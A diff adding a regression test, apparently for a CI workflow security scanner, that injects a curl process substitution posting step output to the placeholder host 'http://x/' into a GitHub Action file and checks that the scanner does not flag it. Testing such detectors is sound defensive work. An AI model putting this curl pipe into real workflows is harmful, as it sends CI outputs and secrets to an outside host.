@@ -40649,6 +40649,27 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("bundel pendek curl kini diurai walk kedua (Audit 2853)", rc != 0)
         shutil.rmtree(sub1918, ignore_errors=True)
+        sub1919 = klon(tmp, "sub1919")
+        berkas_aksi1919 = os.path.join(
+            sub1919, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1919, encoding="utf-8") as f:
+            isi_aksi1919 = f.read()
+        baris_aksi1919 = [b for b in isi_aksi1919.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1919 = isi_aksi1919.replace(
+                baris_aksi1919,
+                baris_aksi1919.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl --header -d @- http://x/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1919 != isi_aksi1919, \
+            "suntikan aksi1919 tidak menembak"
+        with open(berkas_aksi1919, "w", encoding="utf-8") as f:
+            f.write(isi_baru1919)
+        rc, out = jalan(sub1919,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("-d @- sebagai nilai opsi lain kini bukan sumber stdin (Audit 2854)", rc == 0)
+        shutil.rmtree(sub1919, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
